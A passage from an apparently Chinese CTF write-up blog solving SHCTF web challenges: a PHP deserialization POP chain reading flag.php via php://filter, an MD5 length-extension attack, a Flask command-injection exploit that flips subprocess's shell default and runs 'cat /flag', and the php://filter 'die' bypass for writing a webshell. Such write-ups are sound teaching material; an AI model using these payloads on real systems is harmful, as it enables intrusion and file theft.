class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^O:\d+/'</span>,<span class="hljs-variable">$data</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"you should think harder!"</span>);<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>}<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"wanna_fl.ag"</span>])); <br></code></pre></td></tr></tbody></table></figure>
<p>虽然是简单的反序列化，但其中还是很多考点的。我们先总体分析一波。</p>
<p>老思路先找敏感函数，很明显就是include函数了，接下来我们看如何利用其所在的tostring魔术方法：</p>
<p>搜寻一番发现get魔术方法里面存在die(变量)意思是程序结束前将该变量以字符串形式输出，那不就来了嘛，这里显然就是调用tostring的点。</p>
<p>接下来看如何调用get魔术方法：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__get()，读取不可访问属性的值时调用<br></code></pre></td></tr></tbody></table></figure>
<p>那根据上述利用条件我们可以找到wakeup魔术方法中的return语句，这就是我们要利用的点，至于wakeup的方法调用很简单，反序列化即可。</p>
<p>综上所述链子为：<code>musca.wakeup-&gt;misca.get-&gt;milaoshu.tostring-&gt;include</code></p>
<p>接下来就是赋值问题了，这里先上pop</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">misca</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fei</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">musca</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ding</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dong</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">milaoshu</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>;<br>}<br><br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">musca</span>();<br><span class="hljs-variable">$poc</span>-&gt;ding = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">misca</span>();<br><span class="hljs-variable">$poc</span>-&gt;ding-&gt;fei = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">milaoshu</span>();<br><span class="hljs-variable">$poc</span>-&gt;ding-&gt;a = &amp;<span class="hljs-variable">$poc</span>-&gt;ding-&gt;gao;<br><span class="hljs-variable">$poc</span>-&gt;ding-&gt;fei-&gt;v = <span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$poc</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里我们看到上述采用了引用的点，这里是为了绕过misca对象中miaomiao函数对其a属性的值的改变。</p>
<p>剩下的还有绕过最开始的正则检测，这里当时我是直接修改前面的O:5为O:+5，这个其实是可以绕过的，不过很奇怪这道题打不通，后来思索了一番发现，用这种办法似乎会终止反序列化的进程。于是换了一种方法，只需要用array包围要序列化的变量即可。因为该正则就是检验序列化的字符串是否是对象字符串开头。–这里看了官方wp的解释是：+这种方式会受到PHP版本限制</p>
<p>最后就是传参问题了，这里需要以<code>wanna[fl.ag</code>这种方式传参，如下图解密即可得到flag</p>
<p><img src="image-20231031171756811.png" alt="image-20231031171756811"></p>
<h3 id="WEEK2-MD5的事就拜托了">[WEEK2]MD5的事就拜托了</h3>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>])){<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$$$scheme</span>===<span class="hljs-string">'SHCTF'</span>){<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>));<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;/br&gt;"</span>);<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'length'</span>])){<br>        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'length'</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>*<span class="hljs-number">100</span>!=<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>*<span class="hljs-number">100</span>)){<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$flag</span>));<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;/br&gt;"</span>);<br>        }<br>    }<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>]!=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>)){<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'SHCTF'</span>]===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$num</span>))){<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"flag is"</span>.<span class="hljs-variable">$flag</span>);<br>    }<br>} <br></code></pre></td></tr></tbody></table></figure>
<p>当时这道题也是很费脑子且没做出来。。。当时对于<code>$$$scheme</code>这一块儿走通了，但在最后的md5比较就不懂了，如今wp出来了，学习一波。</p>
<p>看了之后发现是考察md5补充攻击。。。没听说过，在此之前我们先拿到flag的md5值和长度再说。</p>
<p>这里关键就是<code>extract</code>与<code>parse_url</code>函数的配合了</p>
<p><img src="image-20231031172924081.png" alt="image-20231031172924081"></p>
<p>这里认真看上面的代码我认为就可以理解了，这里extract函数就是将键名但最变量，键值当做变量的值而已，所以重点是理解parse_url函数，看题目要求我们$$$schema=指定字符串，<code>$num*100!=intval($num*100)</code>后面的我们用浮点类型即可绕过，而前面的payload如下</p>
<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">SHCTF=host://SHCTF:password@user<br>length=1.1<br></code></pre></td></tr></tbody></table></figure>
<p>得到md5值和长度分别为：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">8504ce3799001a7aecb62ec74d3835a5<br>42<br></code></pre></td></tr></tbody></table></figure>
<p>这里就先直接复现一波，后续原理的学习另起一篇文章，漏洞利用工具如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<p>下载zip安装相关依赖，直接运行py文件，根据提示输入内容</p>
<p><img src="image-20231031175753915.png" alt="image-20231031175753915"></p>
<p>这里我是只输入hash和长度了，之后他给了我们新明文以及hash，我们分别给length和SHCTF赋值即可</p>
<p><img src="image-20231031175844738.png" alt="image-20231031175844738"></p>
<p>拿到flag</p>
<h3 id="WEEK2-ez-rce">[WEEK2]ez_rce</h3>
<p>暂时不会。。。</p>
<p>咳咳来补充了（靠官方wp</p>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><br>app = Flask(__name__)<br><br><span class="hljs-comment">#此函数用于遍历并从对象中提取属性。它接受一个对象（obj）和属性名称的列表（arg），然后返回最终属性。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gett</span>(<span class="hljs-params">obj,arg</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,i)<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-comment">#这个函数类似于gett，但用于设置一个具有指定值（num）的属性。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sett</span>(<span class="hljs-params">obj,arg,num</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arg)-<span class="hljs-number">1</span>):<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,arg[i])<br>    <span class="hljs-built_in">setattr</span>(tmp,arg[i+<span class="hljs-number">1</span>],num)<br><br><span class="hljs-comment">#它从subprocess中提取特定属性，将其转换为列表，使用给定的索引num和布尔值bol修改列表中的特定元素，然后将属性设置回修改后的列表。 </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>(<span class="hljs-params">giveme,num,bol</span>):<br>    c = gett(subprocess,giveme)<br>    tmp = <span class="hljs-built_in">list</span>(c)<br>    tmp[num] = bol<br>    tmp = <span class="hljs-built_in">tuple</span>(tmp)<br>    sett(subprocess,giveme,tmp)<br><br>    <span class="hljs-comment">#这个函数用于使用subprocess.call方法执行Shell命令。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">arg</span>):<br>    subprocess.call(arg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>,methods=[<span class="hljs-string">'GET'</span>,<span class="hljs-string">'POST'</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">'exec'</span>)==<span class="hljs-string">'ok'</span>:<br>            shell = request.args.get(<span class="hljs-string">'shell'</span>)<br>            cmd(shell)<br>        <span class="hljs-keyword">else</span>:<br>            exp = <span class="hljs-built_in">list</span>(request.get_json()[<span class="hljs-string">'exp'</span>])<br>            num = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">'num'</span>))<br>            bol = <span class="hljs-built_in">bool</span>(request.args.get(<span class="hljs-string">'bol'</span>))<br>            hint(exp,num,bol)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">'ok'</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">'error'</span><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>附件给了我们源码，这里配合GPT做了一波审计，下面附上关键函数的用法截图：</p>
<p><img src="image-20231103195044902.png" alt="image-20231103195044902"></p>
<p>这里分析了一波，我们来搞一下思路，这里的代码可以实现修改subprocess函数的某些属性，如果我们传入恶意数据就可以修改我们想要的属性的值了。</p>
<p>这里我们可以json传入数据，也就是传入subprocess函数的某些参数，随后num定位我们想要修改的参数位置，bol是修改参数的布尔值，这样传入之后可以通过gett，sett函数的配合，将参数的布尔值修改为我们想要的布尔值。–这里也是通过wp学到了一些审计代码的小知识吧。我们将代码通过pycharm打开来搜索一些代码</p>
<p><img src="image-20231103195829002.png" alt="image-20231103195829002"></p>
<p>如上图我们看到敏感函数call，我们跟踪看一下</p>
<p><img src="image-20231103195857003.png" alt="image-20231103195857003"></p>
<p>我们看到这里接受三个参数，但实际有执行功能的似乎是popen，我们继续跟踪看一下</p>
<p><img src="image-20231103195931464.png" alt="image-20231103195931464"></p>
<p>我们看到其init属性中存在诸多参数，其中有shell的默认值为false，我们看一下官方的提示：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Subprocess.call函数有一个参数shell，当shell为True时，执行命令时是/bin/sh -c “$cmd”这样的，可以进行命令注入。而当shell为false时，执行命令时是/bin/cmd arg这种。而这个方法的shell参数默认为false。<br></code></pre></td></tr></tbody></table></figure>
<p>因此我们要令shell为true才可以，这里就是想办法修改其布尔值了</p>
<p>根据函数的默认参数保存在defaults属性中，我们在终端看一下其位置</p>
<p><img src="image-20231103201618954.png" alt="image-20231103201618954"></p>
<p>如上图可以看到位置在第八个，也就是下标为7，我们给num赋值为7即可</p>
<p>我们构造如下payload，注：json格式，bol为字符串，exp的格式为数组（用来被gett遍历）</p>
<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">{</span><br>    <span class="hljs-attr">"exp"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>		<span class="hljs-string">"Popen"</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">"__init__"</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">"__default__"</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">}</span><br><br>get传参：?num=<span class="hljs-number">7</span>&amp;bol=<span class="hljs-literal"><span class="hljs-keyword">true</span></span>&amp;shell=mkdir%<span class="hljs-number">20.</span>/static;cat%<span class="hljs-number">20</span>/flag&gt;./static/<span class="hljs-number">1.</span>txt&amp;exec=oka<br></code></pre></td></tr></tbody></table></figure>
<p>接下来令exec不为ok即可进入else语句–这里注意content-type的内容</p>
<p><img src="image-20231103203437201.png" alt="image-20231103203437201"></p>
<p>下面要get传参，令exec=ok进入cmd命令执行状态</p>
<p><img src="image-20231103203755216.png" alt="image-20231103203755216"></p>
<p>拿到flag</p>
<p><img src="image-20231103203810165.png" alt="image-20231103203810165"></p>
<h3 id="WEEK3-快问快答">[WEEK3]快问快答</h3>
<p><img src="image-20231031181934913.png" alt="image-20231031181934913"></p>
<p>直接看题目源码，很明显是要写脚本的，由于本人太菜，所以就跟着别的佬去写了。</p>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_answer</span>(<span class="hljs-params">url, headers, answer, cookie</span>):<span class="hljs-comment">#发送请求</span><br>   answer1 = {<span class="hljs-string">'answer'</span>: answer}<br>   response=requests.Session()<br>   response = response.post(url, headers=headers, data=answer1,cookies=cookie)<span class="hljs-comment">#这个需要设cookie，因为每道题的cookie都是不同的</span><br>   <span class="hljs-keyword">return</span> response<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_question</span>(<span class="hljs-params">response</span>):<span class="hljs-comment">#用于计算答案</span><br>   html = response.text<br>   answer=<span class="hljs-number">0</span><br>   pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r"&lt;h3&gt;(.*?)&lt;/h3&gt;"</span>)<span class="hljs-comment">#(.*?)：这是正则表达式的一部分，用于捕获任何字符（除了换行符 \n）零次或多次，非贪婪地匹配，其中的r是为了让其中的反斜杠字符视为普通字符</span><br>   <span class="hljs-keyword">match</span> = pattern.search(html)<br>   <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>       question = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>       numbers = re.findall(<span class="hljs-string">r"\d+"</span>, question)<br>       operation = re.findall(<span class="hljs-string">r'异或|与|\+|-|x|÷'</span>, question)<span class="hljs-comment">#识别运算符</span><br>       op=operation[<span class="hljs-number">0</span>]<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(numbers) == <span class="hljs-number">2</span>:<br>           a = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">0</span>])<br>           b = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">1</span>])<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"异或"</span>:<br>               answer = a ^ b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"与"</span>:<br>               answer = a &amp; b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"-"</span>:<br>               answer = a - b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"+"</span>:<br>               answer = a + b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"x"</span>:<br>               answer = a * b<br>           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"÷"</span>:<br>               answer = <span class="hljs-built_in">int</span>(a/b)<span class="hljs-comment">#这里要特别注意要强转成整形，因为题目只能提交整数，如果不转，脚本运行的时候，会因为提交无效数据而爆500的错误</span><br>           <span class="hljs-comment">#print(question)</span><br>           <span class="hljs-comment">#print(answer)</span><br>   <span class="hljs-keyword">else</span>:<br>           <span class="hljs-built_in">print</span>(<span class="hljs-string">"找不到题目"</span>)<br>   <span class="hljs-keyword">return</span> answer<br> <br>url = <span class="hljs-string">"http://112.6.51.212:32776/"</span>  <span class="hljs-comment"># 这里替换为你要访问的网址</span><br>headers = {<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>}<br>cookie=<span class="hljs-number">0</span><br>answer = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">52</span>):<span class="hljs-comment">#这里要设置成52，相当于循环了51次，因为第一次是初始化，答案是错的</span><br>       time.sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">#这里是为了别让程序答得太快，因为题目答题速度是1到2秒之间</span><br>       response = post_answer(url, headers, answer, cookie)<br>       <span class="hljs-built_in">print</span>(response.text)<span class="hljs-comment">#打印表单</span><br>       answer = parse_question(response)<br>       cookie = response.cookies<br></code></pre></td></tr></tbody></table></figure>
<p>拿到flag，感觉这个脚本还是有难度的。。。。我先练习一波</p>
<p><img src="image-20231031183614448.png" alt="image-20231031183614448"></p>
<p>之后又研究了一波代码，发现<code>match.group(1)</code>此处是必须为1的，如果为0输出如下：很明显会导致我们后续对数字的判断错误</p>
<p><img src="image-20231031190928323.png" alt="image-20231031190928323"></p>
<h3 id="WEEK3-sseerriiaalliizzee">[WEEK3]sseerriiaalliizzee</h3>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;barking-&gt;<span class="hljs-title function_ invoke__">dosomething</span>();<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>{ <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$part1</span>=<span class="hljs-string">''</span>,<span class="hljs-variable">$part2</span>=<span class="hljs-string">''</span></span>) </span>{<br>        <span class="hljs-variable language_">$this</span> -&gt; part1 = <span class="hljs-variable">$part1</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; part2 = <span class="hljs-variable">$part2</span>;<br>        <br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable">$useless</span>   = <span class="hljs-string">'&lt;?php die("+Genshin Impact Start!+");?&gt;'</span>;<br>        <span class="hljs-variable">$useful</span>= <span class="hljs-variable">$useless</span>. <span class="hljs-variable language_">$this</span>-&gt;part2;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; part1,<span class="hljs-variable">$useful</span>);<br>    }<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">'./flag,php'</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"barking for fun!"</span>;<br>        <br>    }<br>}<br><br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>]; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$code</span>)){<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$code</span>);<br>    }<br>    <span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"no way, fuck off"</span>;<br>    }<br><span class="hljs-meta">?&gt;</span> <br>no way, fuck off <br></code></pre></td></tr></tbody></table></figure>
<p>这道题目链子很容易分析，tostring魔术方法的调用在echo 反序列化处就会调用的，难点是利用点在CTF类中的<code>$useful= $useless. $this-&gt;part2;</code>处，但我们可以看到他之前是有一个内容为php代码，其中含有die，这会导致程序的直接退出。此时让我想到了PHP的死亡die绕过，记得p神讲过的：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a>–我只能说讲得真通俗易懂，这里截取关键部分</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">幸运的是，这里的$_POST['filename']是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。<br><br>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。<br><br>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">'txt'</span>] = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'txt'</span>]);<br><span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'txt'</span>]);<br></code></pre></td></tr></tbody></table></figure>
<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，"phpexita"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
